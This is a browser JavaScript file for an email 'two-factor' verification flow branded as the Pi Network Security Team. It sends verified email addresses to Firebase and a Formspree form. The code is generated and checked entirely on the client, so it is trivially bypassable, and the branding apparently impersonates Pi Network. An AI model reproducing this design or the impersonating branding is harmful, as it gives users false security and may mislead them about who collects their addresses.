// script.js - Email Verification Authentication

// Initialize EmailJS with your public key
(function() {
    emailjs.init("tg1jwkpGCD1KCuWle");
})();

// Global variables
let verificationCode = '';
let userEmail = '';
let resendCountdown = 60;
let countdownInterval = null;

// DOM Elements
const emailStep = document.getElementById('emailStep');
const codeStep = document.getElementById('codeStep');
const successStep = document.getElementById('successStep');
const emailInput = document.getElementById('emailInput');
const codeInput = document.getElementById('codeInput');
const sendCodeBtn = document.getElementById('sendCodeBtn');
const verifyCodeBtn = document.getElementById('verifyCodeBtn');
const resendBtn = document.getElementById('resendBtn');
const backToEmail = document.getElementById('backToEmail');
const sentToEmail = document.getElementById('sentToEmail');
const errorBanner = document.getElementById('errorBanner');
const errorText = document.getElementById('errorText');
const sendSpinner = document.getElementById('sendSpinner');
const verifySpinner = document.getElementById('verifySpinner');
const timerText = document.getElementById('timerText');

// Hamburger menu functionality
const hamburger = document.getElementById('hamburger');
const navMenu = document.getElementById('navMenu');

if (hamburger && navMenu) {
    hamburger.addEventListener('click', () => {
        navMenu.classList.toggle('active');
    });
}

// Generate random 6-digit verification code
function generateVerificationCode() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

// Show error message
function showError(message) {
    errorText.textContent = message;
    errorBanner.classList.add('show');
    setTimeout(() => {
        errorBanner.classList.remove('show');
    }, 5000);
}

// Hide error message
function hideError() {
    errorBanner.classList.remove('show');
}

// Navigate between steps
function goToStep(step) {
    document.querySelectorAll('.verification-step').forEach(el => {
        el.classList.remove('active');
    });
    step.classList.add('active');
}

// Start resend countdown
function startResendCountdown() {
    resendCountdown = 60;
    resendBtn.style.display = 'none';
    timerText.textContent = `Resend in ${resendCountdown}s`;
    
    countdownInterval = setInterval(() => {
        resendCountdown--;
        if (resendCountdown > 0) {
            timerText.textContent = `Resend in ${resendCountdown}s`;
        } else {
            clearInterval(countdownInterval);
            timerText.textContent = '';
            resendBtn.style.display = 'block';
        }
    }, 1000);
}

// Send verification code via EmailJS
async function sendVerificationCode(email) {
    try {
        sendCodeBtn.disabled = true;
        sendSpinner.style.display = 'inline-block';
        hideError();

        // Generate new verification code
        verificationCode = generateVerificationCode();
        userEmail = email;

        // EmailJS template parameters
        const templateParams = {
            user_email: email,
            to_email: email,
            verification_code: verificationCode,
            to_name: email.split('@')[0], // Use email username as name
            from_name: 'Pi Network Security Team',
            reply_to: email
        };

        // Send email via EmailJS
        const response = await emailjs.send(
            'service_tmql66a',        // Your EmailJS service ID
            'template_azlv2gd',       // Your EmailJS template ID
            templateParams
        );

        console.log('Verification code sent successfully:', response);

        // Success - move to code verification step
        sentToEmail.textContent = email;
        goToStep(codeStep);
        startResendCountdown();
        codeInput.focus();

    } catch (error) {
        console.error('Error sending verification code:', error);
        
        // More detailed error message
        let errorMessage = 'Failed to send verification code. ';
        if (error.text) {
            errorMessage += error.text;
        } else if (error.message) {
            errorMessage += error.message;
        } else {
            errorMessage += 'Please check your internet connection and try again.';
        }
        
        showError(errorMessage);
    } finally {
        sendCodeBtn.disabled = false;
        sendSpinner.style.display = 'none';
    }
}

// Send confirmation email after successful verification
async function sendConfirmationEmail(email) {
    try {
        const templateParams = {
            user_email: email,
            to_email: email,
            to_name: email.split('@')[0],
            from_name: 'Pi Network Security Team',
            reply_to: email,
            confirmation_date: new Date().toLocaleString('en-US', {
                weekday: 'long',
                year: 'numeric',
                month: 'long',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit'
            })
        };

        // Send confirmation email via EmailJS
        // You'll need to create a second template for confirmation
        const response = await emailjs.send(
            'service_tmql66a',        // Same service ID
            'template_azlv2gd',   // Create a new template for confirmation
            templateParams
        );

        console.log('Confirmation email sent successfully:', response);

    } catch (error) {
        console.error('Error sending confirmation email:', error);
        // Don't show error to user since they're already verified
        // Just log it for debugging
    }
}

// Verify the code entered by user
async function verifyCode(enteredCode) {
    try {
        verifyCodeBtn.disabled = true;
        verifySpinner.style.display = 'inline-block';
        hideError();

        // Check if code matches
        if (enteredCode === verificationCode) {
            // Code is correct - save to Firebase and Formspree
            await saveAuthenticationData();
            
            // Send confirmation email
            await sendConfirmationEmail(userEmail);
            
            // Show success step
            goToStep(successStep);
            
            // Clear the verification code
            verificationCode = '';
            
        } else {
            // Code is incorrect
            showError('Invalid verification code. Please try again.');
            codeInput.value = '';
            codeInput.classList.add('error');
            setTimeout(() => {
                codeInput.classList.remove('error');
            }, 3000);
        }

    } catch (error) {
        console.error('Error verifying code:', error);
        showError('Verification failed. Please try again.');
    } finally {
        verifyCodeBtn.disabled = false;
        verifySpinner.style.display = 'none';
    }
}

// Save authentication data to Firebase and Formspree
async function saveAuthenticationData() {
    const timestamp = new Date().toISOString();
    const data = {
        email: userEmail,
        status: 'enabled',
        timestamp: timestamp,
        verified: true
    };

    try {
        // Save to Firebase
        const emailKey = userEmail.replace(/\./g, '_'); // Replace dots for Firebase key
        await window.db.ref('authenticated_users/' + emailKey).set(data);

        // Also submit to Formspree
        await fetch('https://formspree.io/f/xreaoykw', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                email: userEmail,
                action: '2FA Enabled',
                timestamp: timestamp,
                verified: true,
                _subject: 'Pi Wallet 2FA Status Update - Verified'
            })
        });

        console.log('Authentication data saved successfully');
    } catch (error) {
        console.error('Error saving data:', error);
        // Don't show error to user since verification was successful
    }
}

// Event Listeners

// Send verification code button
sendCodeBtn.addEventListener('click', (e) => {
    e.preventDefault();
    const email = emailInput.value.trim();
    
    if (!email) {
        showError('Please enter your email address');
        emailInput.classList.add('error');
        return;
    }
    
    if (!isValidEmail(email)) {
        showError('Please enter a valid email address');
        emailInput.classList.add('error');
        return;
    }
    
    emailInput.classList.remove('error');
    sendVerificationCode(email);
});

// Verify code button
verifyCodeBtn.addEventListener('click', (e) => {
    e.preventDefault();
    const code = codeInput.value.trim();
    
    if (!code) {
        showError('Please enter the verification code');
        codeInput.classList.add('error');
        return;
    }
    
    if (code.length !== 6) {
        showError('Verification code must be 6 digits');
        codeInput.classList.add('error');
        return;
    }
    
    codeInput.classList.remove('error');
    verifyCode(code);
});

// Resend code button
resendBtn.addEventListener('click', (e) => {
    e.preventDefault();
    sendVerificationCode(userEmail);
});

// Back to email button
backToEmail.addEventListener('click', (e) => {
    e.preventDefault();
    goToStep(emailStep);
    codeInput.value = '';
    verificationCode = '';
    if (countdownInterval) {
        clearInterval(countdownInterval);
    }
});

// Enter key handlers
emailInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        e.preventDefault();
        sendCodeBtn.click();
    }
});

codeInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        e.preventDefault();
        verifyCodeBtn.click();
    }
});

// Only allow numbers in code input
codeInput.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/[^0-9]/g, '');
});

// Email validation
function isValidEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
}

// Remove error styling on input
emailInput.addEventListener('input', () => {
    emailInput.classList.remove('error');
    hideError();
});

codeInput.addEventListener('input', () => {
    codeInput.classList.remove('error');
    hideError();
});

